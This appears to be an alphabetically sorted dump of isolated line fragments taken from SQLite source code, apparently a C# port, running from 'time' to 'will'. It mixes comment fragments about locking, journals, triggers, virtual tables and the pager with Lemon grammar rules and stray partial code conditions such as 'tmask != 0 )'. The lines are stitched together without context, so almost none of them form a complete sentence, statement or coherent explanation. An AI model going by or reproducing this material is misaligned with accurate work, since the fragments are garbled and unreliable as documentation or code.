 time to parse and run the PRAGMA to turn journalling off than it does
 times with the same function but with different values of eTextRep.
 times.  They are evaluated once and the results of the expression
 tmask != 0 ) 
 tmask == 0 ) )
 tname.n ) )
 to 
 to 0. If register rMayHaveNull is already set to some value
 to 0. This is used by the implementations of sqlite3_backup_step()
 to 3.6.0 or later) we should consider fixing the conditional above
 to 6.6 percent. The test case is inserting 1000 rows into a table
 to MX_DELETION_ATTEMPTs deletion attempts are run before giving
 to NULL.
 to NULL.  If the input text contains no SQL (if the input is an empty
 to SQLITE_MAGIC_BUSY we indicate that the connection is in use.
 to TK_AGG_FUNCTION.
 to [database connections] and [prepared statements] so that the
 to [sqlite3_create_function()] and [sqlite3_create_function16()]
 to [sqlite3_create_module()] or [sqlite3_create_module_v2()].
 to a VDBE.
 to a comment remarkably similar to this one) is currently considered
 to a custom page cache implementation.  SQLite makes a copy of the
 to a macro that can assist in verifying code coverage.  For production
 to a string or structure that is guaranteed to exist for the lifetime of
 to access the database.  A preexisting transaction may not be
 to access the source database. The values passed for the source and 
 to adjust the encoding.  Only alphabetic characters and underscores
 to adjust the packing of siblings to get a better balance.
 to all new [database connections]. {END}
 to all source files.  We break it out in an effort to keep the code
 to allocate.  If there is insufficient space in 
 to an integer.  These routines are checking an expression to see
 to an sqlite3_declare_vtab() call. In that case only the column names
 to any internal data structures of SQLite.  It uses only the public
 to any of those tables.
 to any page that is not part of the pointer map itself.)  Each pointer map
 to avoid a duplicate match there. 
 to avoid a memcpy().
 to avoid deadlock issues involving multiple sqlite3.mutex mutexes.
 to avoid the possibility of deadlock when two threads with
 to be a null pointer.
 to be called.
 to be deleting some records.
 to be destroyed is relocated by an earlier OP_Destroy. i.e. if the
 to be every column in TABLE.
 to be executed (to establish a read lock) before this opcode is
 to be experimental.  The interface might change in incompatible ways.
 to be ignored 
 to be interrogated. 
 to be interrupted and might continue to completion.
 to be invalidated whenever sqlite3_step() is called from within
 to be invoked.
 to be met.
 to be oversized. Offset is limited to 98307 above.  But 98307 might
 to be permanent.  So the computation is done on a copy of the SELECT
 to be pinned.
 to be recompiled.  A statement needs to be recompiled whenever the
 to be replayed to restore the contents of the database file (as if
 to be rolled back.  ABORT processing means the operation in process
 to be unique - either because it is an INTEGER PRIMARY KEY or it
 to be updated with the new data before the backup operation is
 to be used when we have not run the ANALYZE command.
 to be useful.
 to by the second parameter and which is N bytes long where N is the
 to by zName will be freed by //sqlite3DbFree() when the vdbe is destroyed.
 to change the content of the page.
 to check if the client actually holds it. This doesn't happen very
 to clean up loaded extensions
 to coerce both inputs according to this affinity before the
 to constants so that the offset of the corresponding field in an
 to count the size: 2
 to decide how much to store locally and how much to spill onto
 to declare the format (the names and datatypes of the columns) of
 to derive a mutex name. 
 to determine the size and alignment of journal header and
 to do anything with MATCH functions.
 to do here is free the sqlite3_backup structure.
 to do here is record the root page number for that index.
 to drop any locks either.
 to enforce this constraint.
 to experimental interfaces but reserve to make minor changes if
 to fetch the content.  Just fill in the content with zeros for now.
 to find a page in the in-memory cache first.  If the page is not already
 to find cases where
 to find the total number of changes including changes caused by triggers.
 to force 8-byte alignment on 64-bit architectures.
 to generate a unique primary key value.
 to generate random integer keys for tables or random filenames.
 to get nField type values.  offset is an upper bound on this.  But
 to get the drive letter to look up the sector
 to get the memory needed to hold the sub-bitmap is the only
 to go further. 
 to guard against future changes to the code generator.
 to handle INSERT statements in SQLite.
 to handle SELECT statements in SQLite.
 to handle UPDATE statements.
 to handle both cases well.
 to have only a real value.
 to help ensure adequate test coverage in places where simple
 to hold deal with values between 1 and iDivisor.
 to hold the  [sqlite3_file] structure passed as the third
 to iTo.
 to ignore the rowid at the end of key1.
 to include the updated change counter and then write page 1
 to indicate no errors.
 to indicate that the page is free.
 to insure data is written to the disk surface before
 to invalidate all pre-compiled statements.
 to invoke any required unlock-notify callbacks.
 to invoking sqlite3_complete16() then sqlite3_initialize() is invoked
 to it. Routines called by the parser as the column definition
 to iterate over the RHS of the IN operator in order to quickly locate
 to its default value when the database is closed and reopened.
 to keep free space after the last cell pointer so that new cells can
 to know.  To minimize the risk of problems due to bad lrand48()
 to loop through the virtual table.  Cursors are created using the
 to make room for the new tables root page. In case this page turns
 to make sz a little too large.  The first
 to make up the difference. If the number of savepoints is already
 to mark the page as clean. This is because marking the page as
 to modify an existing string.  For example:
 to modify the database connection must be deferred until after the
 to modify the db structure at all.  It could be that db is a stale
 to obtain a new Pager.pTmpSpace buffer. If this allocation attempt
 to obtain a shared lock on the pager (which may be this one) will
 to obtain the memory it needs.
 to omit code used by TEMP tables without messy 
 to one of SQLITE_UTF16LE or SQLITE_UTF16BE using the
 to optimize an 'OR' expression that is part of a WHERE clause.
 to optimize an OR expression within the WHERE clause.
 to other database connections that happen to be sharing
 to pCheck.
 to passing the structure to one of the sqliteFixAAAA() routines below.
 to pgno in Pager.pInJournal (bitvec of pages already written to the
 to populate the entire journal header sector.
 to prevent them from trying to use the btree after
 to prevent this by setting mxPathname to a sufficiently large value.
 to print out file-descriptors.
 to problems with locking.
 to promote this lock to EXCLUSIVE so that it can spill cache
 to promote to an exclusive lock.  The first process cannot proceed
 to provide the constant while making all compilers happy.
 to read from the disk) then the pMem is left in an inconsistent state.
 to read or write that page.  The pending byte page is set assign
 to recognize the end of a trigger can be omitted.  All we have to do
 to recycle pages to reduce the number allocated to pcache.nMaxPage.
 to redistribute the cells within the tree. Since balance() may move
 to reduce a pristine expression tree from the parser.  The implementation
 to represent the greater-than-or-equal-to operator in the expression
 to reset the PRNG to its initial state.  These routines accomplish
 to reside at pgnoRoot).
 to restore the database to its original configuration.
 to retrieve the collation sequence set by this opcode is not available
 to return a value. The following call releases any resources
 to return an integer result code for historical reasons.
 to satisfy small transient memory allocation requests for objects
 to save the Parse.zAuthContext value so that it can be restored later.
 to search for the table. 'Fix' the table name to this db
 to see if the implementation wants to overload this function 
 to see if there are indices that can be used to speed up the loop.
 to see new result codes in future releases of SQLite.
 to setup for a later assert() statement.  We do not want this code to
 to signal SQLite whether or not the action is permitted.  See the
 to sort because the primary key is unique and so none of the other
 to sqlite3DeferForeignKey() might change this to DEFERRED.
 to sqlite3PagerClose().
 to sqlite3Parser and sqlite3ParserFree.
 to sqlite3_column_text() or sqlite3_column_blob() with calls to
 to sqlite3_config() along with the [SQLITE_CONFIG_MUTEX] option.
 to sqlite3_create_collation() or sqlite3_create_collation16().
 to sqlite3_initialize() should be a no-op.  But the initialization
 to sqlite3_mutex_alloc() is one of these integer constants:
 to sqlite3_randomness() will reseed the PRNG using a single call
 to sqlite3_step(). For consistency (since sqlite3_step() was
 to sqlite3_update_hook().
 to store a copy of an expression or expression tree.  They differ in
 to store the overflow cell. balance_quick() inserts a new cell
 to support legacy SQL code.  The safety level used to be boolean
 to sync the file following this operation.
 to test the Bitvec.  The integers are opcodes followed
 to test the case where a malloc error occurs while trying to set
 to test the data structure at runtime in this case.
 to test whether a file is at least readable.   The file can be a
 to that SrcList.
 to that setting.
 to that.  But if the largest existing rowid is already the maximum
 to the CollSeq given.
 to the WHERE clause:    A.X=B.X AND A.Y=B.Y AND A.Z=B.Z
 to the [prepared statement] that is being evaluated (the [sqlite3_stmt
 to the [sqlite3_prepare_v2()] call (or its variants) that was used to
 to the auth function is one of these constants:
 to the blob case and use memcmp().  
 to the callback are zero-terminated strings that contain additional
 to the callback function is uses to build the result.
 to the callback is an integer [SQLITE_COPY 
 to the callback routine that implements the aggregate function.
 to the caller.
 to the cell content.
 to the codec.
 to the comparison.  This makes the opcode work like IdxLE.
 to the database file. So there is no need to zero the journal
 to the elements of the FROM clause.  But we do not want these changes
 to the empty state.
 to the end.  EXTRA_SIZE is the number of bytes of space needed to hold
 to the first byte after the last byte written before returning.
 to the first error encountered (the journal finalization one) is
 to the first freeblock is given in the header.  Freeblocks occur in
 to the following instruction.
 to the global function hash table.  This occurs at start-time (as
 to the hash table).
 to the hash table.
 to the head of a linked list of VTable structures. Each VTable 
 to the journal then we can return right away.
 to the last entry in the b-tree. 
 to the module implementation.
 to the new trigger step.
 to the object.
 to the original subexpression content and wtFlags is set up appropriately
 to the pTriggerStack member of the Parse stucture and coding of the parent
 to the page and its siblings fit into MemPage.aData[] before returning.
 to the page we are coming from.  If we are coming from the
 to the page.  
 to the parameters at a later time.
 to the rollback.
 to the row to be deleted and the sqlite3VdbeCursorMoveto() operation
 to the same database. Sharing is enabled if the argument is true
 to the schema.
 to the specified offset in the buffer and updates 
 to the sqlite3_backup_finish() to release associated resources.
 to the state it was in N Pushes ago.
 to the table currently under construction.
 to the tail of the list (first page to be recycled).
 to the transaction.
 to the underlying data.
 to the user because it requires a lock that will not be available
 to the value of the iLimit parameter passed to xTruncate(). If any
 to the virtual root page instead of the actual root page. A table has a
 to the xRandomness method of the default VFS.
 to this collation sequence. 
 to this function.
 to this one BtShared object.  BtShared.nRef is the number of
 to this procedure.
 to this routine results in undefined and probably undesirable behavior.
 to this virtual table 
 to turn this limit off.
 to use D and invoking [sqlite3_mutex_leave]([sqlite3_db_mutex](D)) after
 to use Mac OS X style fullsync instead of fsync().
 to use SQLite concurrently from more than one thread.
 to users so they cannot do the sizeof() themselves - they must call
 to virtual table cursors are set. This is used to selectively disable
 to visit is the right-child of its parent.
 to which a [prepared statement] belongs.  The [database connection]
 to which trace output should be written.
 to winceLockFile 
 to write any error messages.
 to write the journal header file.
 to xFetch().
 to xWrite().
 to zero and clear the PGHDR_NEED_SYNC flag on all pagess.
 to zero-terminated strings that  contain the names of the columns.
 to.  offset and amt determine what portion of the data or key to retrieve.
 together with Expr.zToken strings.
 token 
 token != TK_BEGIN ) )
 token != TK_FOR 
 token != TK_USING )
 token == TK_ON )
 token for additional information.
 token in the sequence of tokens that describe the type of the
 token.  Space to hold the returned string
 tokens that point to volatile memory. The 'span' of the expression
 too large - whose size exceeds p.db.aLimit[SQLITE_LIMIT_LENGTH].
 tool is being used for file sharing) implements locks correctly between
 top)
 top-level SQL code.
 top. 
 total memory allocation is about to exceed the soft heap
 total.
 tr_tm != TK_INSTEAD )
 tr_tm == TK_INSTEAD )
 tr_tm == TRIGGER_AFTER )
 trace is a pointer to a function that is invoked at the start of each
 tracing and profiling the execution of SQL statements.
 transaction and set the shared state to TRANS_READ.
 transaction and unlock the pager.
 transaction count of the shared btree. If the transaction count
 transaction files are deleted.
 transaction is active on that particular database file.
 transaction is active).
 transaction is committed before returning.
 transaction is committed.
 transaction is rolled back.  All outstanding pages are invalidated
 transaction is rolled back. This is different to calling
 transaction might also be rolled back if an error is encountered.
 transaction might be rolled back automatically.  The only way to
 transaction on each used database and to verify the schema cookie
 transaction remains open.
 transaction was first opened. In this case we can mark the page
 transaction will be committed or rolled back as a result of the
 transaction will be rolled back by the layer above.
 transaction.
 transaction.  If the second argument is 2 or more and exclusive
 transaction.  This is needed so that the statement
 transaction. Nor will it be considered to be a hot-journal by this
 transactions are not needed.  So change every OP_Statement
 transfer optimization is used.  This is used for testing
 transformations that occur.
 transitions and the inserted intermediate states:
 transitions leaving the lock state different from what it started but
 translate the cursor numbers into bitmask values and OR all
 translates these sparse cursor numbers into consecutive integers
 translating a 2-byte character to a 4-byte UTF-8 character.
 transtype ::= 
 transtype ::= DEFERRED 
 transtype ::= EXCLUSIVE 
 transtype ::= IMMEDIATE 
 treated as a hot-journal and rolled back.
 treated as functions that return constants 
 tree that we can be sure that any problem in the internal node has
 tree with depth of iDepth.  A depth of 1 means the tree contains a single
 tree.
 tricky bit is figuring out the pointer to return in pzTail.
 tridxby ::= INDEXED BY nm 
 tridxby ::= NOT INDEXED 
 tried to do recently failed with an SQLITE_LOCKED error due to locks
 tries to unlock the database file if not in exclusive mode. If the
 trigger argument reference
 trigger context.
 trigger continues.
 trigger finishes.
 trigger is in TEMP in which case it can refer to any other database it
 trigger is not visible to the database connection that does the
 trigger). All names are legal except those that begin with the string
 trigger.
 trigger.  Subtriggers create subcontexts for their duration.
 trigger]. 
 trigger_cmd 
 trigger_cmd ::= DELETE FROM trnm tridxby where_opt 
 trigger_cmd ::= UPDATE orconf trnm tridxby SET setlist where_opt 
 trigger_cmd ::= insert_cmd INTO trnm inscollist_opt VALUES LP itemlist RP 
 trigger_cmd ::= insert_cmd INTO trnm inscollist_opt select 
 trigger_cmd ::= select 
 trigger_cmd_list 
 trigger_cmd_list ::= trigger_cmd SEMI 
 trigger_cmd_list ::= trigger_cmd_list trigger_cmd SEMI 
 trigger_decl ::= temp TRIGGER ifnotexists nm dbnm trigger_time trigger_event ON fullname foreach_clause when_clause 
 trigger_event 
 trigger_event ::= DELETE
 trigger_event ::= UPDATE 
 trigger_event ::= UPDATE OF inscollist 
 trigger_time ::= 
 trigger_time ::= AFTER 
 trigger_time ::= BEFORE 
 trigger_time ::= INSTEAD OF 
 triggers are not counted. Use the [sqlite3_total_changes()] function
 triggers as usual.  The previous value will be restored once the trigger
 triggers on pTab in the TEMP schema.  This routine prepends all
 triggers.  A new AutoincInfo structure is created if this is the
 triggers. Don't use IN(...) in case SQLITE_OMIT_SUBQUERY is defined.
 trim path to just drive reference 
 trnm ::= nm 
 trnm ::= nm DOT nm 
 true : false
 true : false ) 
 true : z[cnt] == wc[0] 
 true for reverse ROWID and false for forward ROWID order.
 true if it does and false if it does not.
 true if shared-cache mode enabled 
 true if the BtShared.nRef counter reaches zero and return
 true if the DISTINCT keyword is present 
 true.
 true.  Following these are pTab.nCol register holding column
 truncated version of the usual Expr structure that will be stored as
 truncation will be done when the current transaction is committed.
 try to execute malicious statements that damage the database.  For
 try to free the KeyInfo.
 try to write the contents of pPg to disk.
 trying to compute the column names.  If we enter this routine with
 trying to do secure encryption or anything like that...
 trying to save cursor positions. If this is an automatic rollback (as
 turn means that the other connection has made uncommitted changes
 turn the limit off.  That is no longer true.  It is not possible
 turns off all busy handlers.
 two circumstances:
 two columns are the names of the table and index.  The third column
 two elements in the FROM clause of the subquery.
 two extra things may need to happen:
 two or more btrees in common both try to lock all their btrees
 two temporary tables.  Hence it has its own case.  Begin
 type != SQLITE_NULL )
 type 0 
 type 1 
 type ::= typetoken 
 type >= SHARED_LOCK )
 type N-1 
 type affinity of the other operand.  This routine returns the
 type affinity that should be used for the comparison operator.
 type of join.  Return an integer constant that expresses that type
 type of the function
 type of the next token 
 type of the previous token 
 type to the other occurs as necessary.
 type.
 type:       Column declaration type.
 typeRowid == 7 ) )
 typeRowid > 9 
 typename ::= ids 
 typename ::= typename ids 
 types can be conveniently redefined at compile-type.  Like this:
 types use so much data space that there can only be 4096 and 32 of
 typetoken ::= typename 
 typetoken ::= typename LP signed COMMA signed RP 
 typetoken ::= typename LP signed RP 
 u < len 
 u < nRec 
 u < p.nField 
 u.pAndInfo set to a dynamically allocated WhereAndTerm object.
 uint dwVersion (4 bytes) 
 unallocated    
 unbalanced.  But odds are that we will be inserting new entries
 unchanged (this is so that any opcodes already allocated can be
 unchanged and jump to instruction P2.
 unchanged.)
 undef SQLITE_DEFAULT_PAGE_SIZE
 undef SQLITE_HAVE_ISNAN
 undef SQLITE_MAX_DEFAULT_PAGE_SIZE
 undef SQLITE_MIXED_ENDIAN_64BIT_FLOAT
 undef SQLITE_TEXT
 undef SQLITE_VERSION
 undef SQLITE_VERSION_NUMBER
 undef double
 undef isView
 undefined.
 under construction in the pParse.pNewTable field.
 underface.  Use the [UPDATE] SQL command to change the size of a
 underlying device:
 underlying implementation to return an error if one occurs during
 underlying operating system supports it.  If the OS lacks
 understands.
 underway.  Starting a write transaction also creates a rollback journal. A
 undo changes.
 undoing any prior invocation of [SQLITE_CONFIG_MALLOC].  If the
 unique.
 uniqueflag ::= 
 uniqueflag ::= UNIQUE 
 unknown or unsupported join type 
 unlike that index from its Table then remove the index from
 unlock so that it can proceed.
 unlock-notify callback is cancelled. The blocked connections 
 unlock-notify callback is registered. The system is said to be in
 unlock-notify callback may also be canceled by closing the blocked
 unmodified.  ORDER BY terms that are integers outside the range of
 unnecessary sort of the result set if an index appropriate for the
 unpredictable and might not equal either the old or the new
 unreachable code 
 unrecognized string argument.
 unref() the parent page pointer when this page is no longer referenced.
 unreferenced dirty page.
 unrolling for the 3- and 4-byte varint cases.  This code is
 unspecified.  A trunk page looks like this:
 until DESTROY.
 until connection pBlocker concludes its current transaction.
 until it can be obtained.
 until the busy callback returns false or until the attempt to
 until the change-counter check fails in PagerSharedLock().
 until the close operation if they will fit.
 up and returning an error.
 up generating an OP_SCopy to move the value to the destination
 up global structures and mutexes required by the custom page cache 
 up initializing the Vdbe.azVar[] array.  That is a little extra
 up the shared-btree.
 up to N bits.  Let I be an integer between 0 and N.  0<=I<N.
 up to the point of the BEGIN before the trigger actions.  A Trigger
 up.
 update can proceed.  Processing continues and no error is reported.
 update the change-counter at all. This may lead to cache inconsistency
 updated at the same time.
 updated by the ContextPush and ContextPop opcodes (used by triggers).
 updated is a view
 updated to reflect the changes made by the current transaction and
 upgraded to exclusive by calling this routine a second time - the
 upon successful entry.  Mutexes created using SQLITE_MUTEX_RECURSIVE can
 upon successful entry.  {H17026} Mutexes created using
 upper 4 bytes.  Return the result.
 upper bound on the size of allocated memory.  No memory is freed
 upr) / 2)
 url_file_path)
 usable by indices within the WHERE clause processing logic.
 usableSize - 5) / (usableSize - 4)
 usableSize/4 - 8 entries will be reported as corrupt.  In order
 usableSpace: Number of bytes of space available on each sibling.
 use UTF-16.
 use an index to satisfy IS NULL constraints on that table.  This is
 use by SQLite only.  Applications that use SQLite mutexes should
 use by the action routines.
 use either balance_nonroot() or balance_deeper(). Until this
 use it as the variable number 
 use of a bitmask encoding for the operator allows us to search
 use of indices.  Note also that when the IN operator appears in
 use of the bits in our bitmasks.  This structure provides a mapping
 use only 
 use only the UNION ALL operator. And none of the simple select queries
 use only the dynamic mutexes returned by SQLITE_MUTEX_FAST or
 use the Julian calendar for dates prior to 1582-10-15 and for some
 use the value in register P3 as a key. If cursor P1 refers
 use the value in register P3 as the key.  If cursor P1 refers
 use this information to make sure that the zero-blob functionality
 use when they are deallocated. {A17022} Attempting to deallocate a static
 use.
 use.  sqlite3SafetyCheckSickOrOk() allows a db pointer that failed to
 useIndexOnly != 0 )
 used as an argument to sqlite3_errmsg() or sqlite3_close().
 used by SQLite when the btree layer moves a table root page. The
 used by the current version of SQLite.  Future versions of SQLite
 used for converting values to text for returning to the user (i.e. via
 used if allowAffChng is true.
 used in SQLite.
 used in the journal to signify that the remainder of the journal file
 used in the table for brevity and because they are familiar to most
 used to allocate and use mutexes.
 used to attach the destination database to the handle. The database name
 used to clean up the mess that was left behind.
 used to create the connection. Once a virtual table has been
 used to create the initializers for the FuncDef structures.
 used to detect the end of a statement is much simplier
 used to determine the results of the comparison.  If both values
 used to generate an error message if the lock cannot be obtained.
 used to hold those values.
 used to implement an SQL statement.</dd>
 used to initialize a newly created index or to recompute the
 used to store a master journal file name at the end of a journal file.
 used to store configuration parameters that affect the way the pager
 used to store the parent's overflow cells. Because this function inserts
 used to store the set of table-locks required by the statement being
 used to test if pgno is a pointer-map page. PTRMAP_ISPAGE implements
 used when no other memory allocator is specified using compile-time
 used will be case sensitive or not depending on the RHS.
 used. Otherwise the collation sequence for the right hand expression
 useful if invoked immediately after the main database i
 user and the later is an internal programming error.
 user function may have called an sqlite3_result_XXX() function
 user of the schema.
 user tables and indices.
 user wants (and specified in the grammar) and is available for
 user's Ansi codepage.
 user-defined function or returned to the user as the result of a query.
 user-defined functions that have side effects.  We do not care
 user-entered SQL is being [sqlite3_prepare 
 user-supplied authorization function returned an illegal value.
 uses aggregates and subqueryIsAgg is true if the subquery uses aggregates.
 uses it opaquely as an argument to sqlite3BackupRestart() and
 using -DSQLITE_TEMP_FILE_PREFIX=myprefix_ on the compiler command line.
 using OP_NotFound prior to invoking this opcode.
 using SQLite incorrectly.
 using UNION ALL operators. In this case N is the number of simple
 using [sqlite3_close()].
 using [sqlite3_finalize()] or until the same information is requested
 using [sqlite3_free].
 using clause from the table on the right. 
 using either [sqlite3_prepare_v2()] or [sqlite3_prepare16_v2()] instead
 using mutexes.  And we do not want the assert() containing the
 using scratch memory at the same time.</dd>
 using sqlite3GetTempRange() inside of the sqlite3GenerateIndexKey()
 using sqlite3_config(SQLITE_CONFIG_PAGECACHE) option. If no such buffer
 using the ATTACH command.
 using the [xFindFunction] method of the [virtual table module].  
 using the same locking range we are at least open to the possibility.
 using the sqlite3BtreeSavepoint() function.
 using the sqlite3_automatic_extension() API.
 using the sqlite3_limit() interface.
 using_opt 
 using_opt ::= 
 using_opt ::= USING LP inscollist RP 
 v == 41 )
 v-table would have to be ready for the sqlite3_vtab structure itself
 v2]
 vacuum database. The vacuum_db journal file is deleted when the pager
 vacuum.  Even entries are the meta value number and odd entries
 val > max 
 valid to call this function from within the xCreate() or xConnect() of a
 valid.
 value 2
 value SQL NULL. Even though the Mem structure contains an element
 value added by the INSERT will not be visible to the second TEST.
 value appended to the end of the index record. This rowid value may
 value but we cannot change the implementation of sqlite3_snprintf()
 value can be NULL if zDb is also NULL.  If zTable is NULL it
 value described by z[0..n-1] into register iMem.
 value from sqlite3_column_blob() for a zero-length BLOB is an arbitrary
 value given in the 2nd argument.
 value in any case.
 value in variable pColl.
 value indicates that the database connection passed into the API is
 value is also stored in the Expr.iAgg column in the aggregate so that
 value is increased to the start of the next page in the journal.
 value is the same as the sqlite3_last_insert_rowid() API function.
 value means no limit. This value may be overridden using the
 value of nRec from the size of the journal file.  But if a power
 value of register P2 will then change.  Make sure this does not
 value of the nonterminal uninitialized is utterly harmless as long
 value of the root page that moved - its value before the move occurred -
 value of this routine is the same regardless of whether the journal file
 value of this select in a memory cell and record the number
 value specified if the change is allowed.  The change is disallowed
 value to a ptr value under the MSVC 64-bit compiler.   Casting
 value to the application-defined function. If no metadata has been ever
 value will be restored the next time the database is opened.
 value will increment whenever this happens. 
 value.
 value. 
 value.  For these latter parameters nothing is written into 
 value.  For those parameters
 value.  Return a pointer to its binary value.  Space to hold the
 value. Reset it to the correct value for this process.
 values 
 values and SQL variables.
 values associated with the [sqlite3_stmt_status()] interface.
 values between 1 and iDivisor.  apSub[1] holds values between
 values from a SELECT but the data is being inserted into a table
 values greater than Key(0) and less than Key(1).  All of the keys
 values need not be contiguous but all P1 values should be small integers.
 values returned by the SELECT are not required.
 values stored in Pager.dbSize etc. might become invalid if
 values to wrap around.
 values.
 var 
 variable even if the zText variable is a NULL pointer.
 variable is used for two purposes: to allow xDestroy methods to execute
 variable is used to facilitate that change.
 variable number.
 variable to locktype before returning.
 variables and link the cursor into the BtShared list.  
 variables and without the extra range tests.  But
 variables in the aVar[] array.
 variables used by the sqlite3_value_
 variables.
 varint. This information is used to attempt to avoid parsing
 various SQLITE_IO_XXX errors.
 various aspects of the generated parser.
 various fields of the database.  The first argument to the auth function
 various times when an SQL statement is being run by [sqlite3_step()].
 vary depending on the [SQLITE_CONFIG_SINGLETHREAD 
 vaultType 
 vdbe memory cell to manage the memory allocation required for a
 vdbe program
 verb to sqlite3_config(). Parameter pBuf points to an allocation large
 version 3.5.0 there is no mechanism for limiting the heap usage for
 version of SQLite that it is linking against was compiled with
 versions of SQLite may change the behavior of sqlite3_column_type()
 versions of SQLite will not be able to load each others' shared
 very fast and which reduce fragmentation of indices.
 vfsList == null )
 via the sqlite3PagerGetExtra() API.
 vice-versa).
 view in one database does not refer to objects in a different database.
 violation) has occurred.  sqlite3_step() should not be called again on
 virtual machine from VDBE_MAGIC_RUN or VDBE_MAGIC_HALT back to
 virtual machine is deleted.
 virtual machine that is the wrong state or which has already been finalized.
 virtual module tables written in this transaction. This has to
 virtual module xSync() callback. It is illegal to write to 
 virtual root page when the actual root page contains no cells and a
 virtual table and is not checked again by SQLite.
 virtual table currently under construction in pParse->pTable.
 virtual table in the FROM clause and the WhereLevel structure is
 virtual table module.
 virtual table then allocate space for the aOrderBy part of
 virtual table.  The pIdxInfo pointer contains indexing
 virtual tables will always return an error.
 virtual tables.  The native query optimizer does not attempt
 void
 vtab with active Connect/Create method 
 vtabarg ::= 
 vtabargtoken ::= ANY 
 vtabargtoken ::= lp anylist RP 
 w.pParse.nErr > 0 )
 walk the cursor up the tree to the internal node and balance it as
 walk up the BTree from any leaf to the root.  Care must be taken to
 want to place more severe limits on the complexity of an
 want to subclass this object by appending additional fields
 want without having to go throught the ascending lock
 wants.
 warning:
 was   free(zConverted)
 was   free(zOut)
 was   free(zTemp)
 was MemPage.Length
 was already pointing to the first entry in the database before
 was already pointing to the last entry in the database before
 was called to create a table generated from a
 was committed at the btree level). So it safe to end the transaction
 was created to be the PRIMARY KEY or to fulfill a UNIQUE
 was created.
 was defined  (using [sqlite3_busy_handler()]) prior to calling
 was executed.
 was last placed at.  Cursors can move when the row they are pointing
 was last positioned.  Return an error code if an OOM fault or I/O error
 was left unspecified in the original SQL statement.  The pFix structure
 was not obtained from sqlite3_malloc() or sqlite3_realloc().
 was obtained from /dev/random.  It is used only as a sanity check.
 was prepared from UTF-16 text using [sqlite3_prepare16_v2()].
 was unpinned.
 way around.  The SQLITE_IOCAP_SEQUENTIAL property means that
 way that makes it safe to invoke [sqlite3_blob_close()] on 
 way will result in an incompatible file format.
 we already have page 1 loaded into cache and marked dirty. 
 we also disallow the transfer optimization because we cannot
 we are counting rows.
 we are resolving names in the WHERE clause of the following command:
 we can always lock and unlock them all quickly.
 we can be sure that no other temp registers have been allocated
 we can invoke OP_Column to fill in the vdbe cursors type
 we can skip these cause they were (effectively) done above in calc'ing s 
 we can skip this cause it was (effectively) done above in calc'ing s 
 we didn't find it in the hash.  h points to the first 
 we do not have to sort.  The OP_OpenEphemeral table will be
 we do not know what the unique ID will be (because the insert has
 we don't want to recreate it.
 we don't want to run it too often and soak up CPU cycles for no
 we failed to detect any corruption.
 we figure out that the sorting index is not needed.  The addrSortIndex
 we found it.
 we get to the following sqlite3OsCheckReservedLock() call.  If that
 we have a match (cnt>0) or when we run out of name contexts.
 we have the following table and index:
 we have to check the semantics.
 we have to disallow the transfer optimization because the
 we have to do some additional checking to see if case 1 really
 we have to locate the state vector at run-time.  In the more common
 we have to use a intermediate table to store the results of
 we need a place to cache virtual table index information for each
 we need to remember from this invocation of the callback.
 we need to run the sorter and output the results.  The following
 we transition back to normal indentation.
 we will continue to restrict the number of entries to usableSize/4 - 8
 web browser that has its own databases for storing history and
 well be good enough.  But maybe not.  Or maybe lrand48() has some
 well-formed CREATE TRIGGER statement.  Semicolons that are embedded within
 well.  
 were called on statement p.
 were pointing and which now may have been changed due
 were present in the journal.
 were present.  The cursor might point to an entry that comes
 what action is being authorized.  These are the integer action codes that
 what kind of permissions the xAccess method is looking for.
 what property of SQLite is to be configured.  Subsequent arguments
 what remains uncompiled.
 whatever it does.  While this other process is holding the
 when SQLite is compiled with [SQLITE_OMIT_AUTOINIT] might become the
 when SQLite is in the middle of a large transaction where all the
 when a 1-byte UTF-8 character is translated into a 2-byte UTF-16
 when a DROP TABLE is mentioned.
 when a new virtual table is be being created or reinitialized.
 when a page that previously contained data becomes a free-list leaf
 when compiling on a different architecture.
 when doing a ROLLBACK and the nRec==0 chunk is the last chunk in
 when it recognizes an ANALYZE command.
 when multiple affinity types are concatenated into a string and
 when opening a hot journal file to roll it back.
 when saveCursorPosition() was called. Note that this call deletes the
 when syntax rules are reduced.  The routines in this file handle the
 when the ALTER TABLE is executed and one of the literal values written
 when the API exits.
 when the RowSet is destroyed.
 when the VDBE cursor to the table is closed.  In this case Table.tnum
 when the [threading mode] is Serialized.
 when the accessor is holding the global mutex (see pcache1EnterMutex()
 when the blocking connections current transaction is concluded. The
 when the connection currently holding the required lock relinquishes it.
 when the database file is not unlocked
 when the last cursor is closed.
 when the symbol is popped from the stack during a
 when there is lock contention. If SQLite determines that invoking the busy
 when this routine is called.
 when this routine is used for Walker.xExprCallback then
 when_clause 
 when_clause ::= 
 when_clause ::= WHEN expr 
 where X is a reference to the iColumn of table iCur and <op> is one of
 where the Table structure returned represents table <tbl>.
 where the first (N-1) fields match but the rowid value at the end
 where the sizes very.  Preprocessor macros are available so that the
 where this risk can be ignored:
 where to jump to for a RAISE(IGNORE) 
 where_opt 
 where_opt ::= 
 where_opt ::= WHERE expr 
 whereas moveToRightmost()
 whereas only characters less than 0x80 do in ASCII.
 whether meta data associated with a user function argument using the
 whether or not it requires a protected sqlite3_value.
 whether or not the journal is hot.
 whether or not to rollback the current transaction.  Do not rollback
 which are called often under normal circumstances.
 which branch will be followed. It is therefore assumed that no runtime
 which can be expensive on some platforms.
 which closes the b-tree cursor and (possibly) commits the
 which columns to include in the result 
 which database file in db.aDb[] the schema refers to.
 which in turn can make database access faster.
 which is also the right-most entry on the page.
 which is attached to the from-table.  The to-table need not exist when
 which is in database iDb.  Return the register number for the register
 which is not at all the same thing.
 which is one of these integer constants.
 which is only available if your application was compiled with
 which is stored in the key size entry of the cell header rather than in
 which may or may not empty the freelist.  A full autovacuum
 which means that only dates between 0000-01-01 and 9999-12-31 can
 which means they have acquired the necessary locks and opened
 which means we can use reader/writer locks.  When reader/writer locks
 which might be more or less than the amount requested.
 which need to be locked after p.  If we cannot get a lock on
 which pages are available.
 which to write into the output buffer. This function copies the
 while [sqlite3_changes()] is running then the value returned
 while [sqlite3_total_changes()] is running then the value
 while any database connection is open results in undefined and
 while any part of SQLite is otherwise in use in any thread.  This
 while reading the record from the (sub-)journal file or while writing
 whole days 
 whose result set is defined by pEList appears as entry in the
 wildcard that matches anything.  Likewise if pEList==NULL then
 will accept either a protected or an unprotected sqlite3_value.
 will also set or clear the busy handler.
 will always return SQLITE_BUSY.  {H17030} The SQLite core only ever uses
 will attempt to compile the supplied statement against whatever subset
 will balance the parent page to correct this.
 will be after the update. (The old record number is currently
 will be allocated and initialized.
 will be calling are designed to work with multiple tables and expect
 will be closed before this function returns.  
